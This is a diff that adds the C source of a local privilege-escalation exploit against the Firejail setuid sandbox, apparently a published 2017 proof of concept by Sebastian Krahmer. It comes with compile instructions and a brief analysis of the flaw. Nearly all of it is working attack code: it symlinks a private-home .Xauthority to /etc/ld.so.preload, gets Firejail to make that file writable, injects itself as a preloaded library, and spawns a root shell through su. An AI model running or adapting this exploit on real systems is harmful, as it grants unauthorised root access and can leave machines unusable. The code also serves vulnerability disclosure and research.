@@ -1,0 +1,101 @@
+/* firejail local root exploit (host to host)
+ *
+ * (C) 2017 Sebastian Krahmer under the GPL.
+ *
+ * WARNING: This exploit uses ld.so.preload technique.
+ * If you are in bad luck, you may end up with an unusable system.
+ * SO BE WARNED. ONLY TEST IT IN YOUR SAFE VM's.
+ *
+ * Get the beauty that this is a shared lib and a running
+ * executable at the same time, as we tamper with /etc/ld.so.preload
+ *
+ * Therefore you have to compile it like this:
+ *
+ * $ cc -fPIC -fpic -std=c11 -Wall -pedantic -c firenail.c
+ * $ gcc -shared -pie firenail.o -o firenail
+ * $ ./firenail
+ *
+ * DO NOT TELL ME THAT SELINUX WOULD HAVE PREVENTED THIS EXPLOIT.
+ * IF I WAS ABOUT TO BYPASS SELINUX ALONG, I WOULD HAVE DONE THE
+ * EXPLOIT DIFFERENTLY.
+ *
+ * Analysis: Sandboxing is cool, but it has to be done right.
+ * Firejail has too broad attack surface that allows users
+ * to specify a lot of options, where one of them eventually
+ * broke by accessing user-files while running with euid 0.
+ * There are some other similar races. Turns out that it can be
+ * _very difficult_ to create a generic sandbox suid wrapper thats
+ * secure but still flexible enough to sandbox arbitrary binaries.
+ *
+ * Tested with latest commit 699ab75654ad5ab7b48b067a2679c544cc8725f6.
+ */
+#define _POSIX_C_SOURCE 200212
+#include <stdio.h>
+#include <unistd.h>
+#include <stdlib.h>
+#include <string.h>
+#include <fcntl.h>
+#include <errno.h>
+#include <sys/stat.h>
+#include <sys/types.h>
+
+
+const char *const ldso = "/etc/ld.so.preload";
+
+int main();
+
+__attribute__((constructor)) void init(void)
+{
+	if (geteuid())
+		return;
+
+	unlink(ldso);
+	char *sh[] = {"/bin/sh", "--noprofile", "--norc", NULL};
+	setuid(0);
+	setgid(0);
+	execve(*sh, sh, NULL);
+	exit(1);
+}
+
+
+void die(const char *s)
+{
+	perror(s);
+	exit(errno);
+}
+
+
+int main()
+{
+	printf("[*] fire(j|n)ail local root exploit 2017\n\n");
+
+	char me[4096] = {0}, *home = getenv("HOME");
+	if (!home)
+		die("[-] no $HOME");
+	if (readlink("/proc/self/exe", me, sizeof(me) - 1) < 0)
+		die("[-] Unable to find myself");
+
+	char path[256] = {0};
+	snprintf(path, sizeof(path) - 1, "%s/.firenail", home);
+	if (mkdir(path, 0700) < 0 && errno != EEXIST)
+		die("[-] mkdir");
+
+	snprintf(path, sizeof(path) - 1, "%s/.firenail/.Xauthority", home);
+	if (symlink(ldso, path) < 0 && errno != EEXIST)
+		die("[-] symlink");
+
+	system("firejail --private=.firenail /usr/bin/id");
+
+	int fd = open(ldso, O_RDWR|O_TRUNC);
+	if (fd < 0)
+		die("[-] open");
+	write(fd, me, strlen(me));
+	write(fd, "\n", 1);
+	close(fd);
+
+	char *su[] = {"/bin/su", NULL};
+	execve(*su, su, NULL);
+	die("[-] execve su");
+
+	return -1;
+}
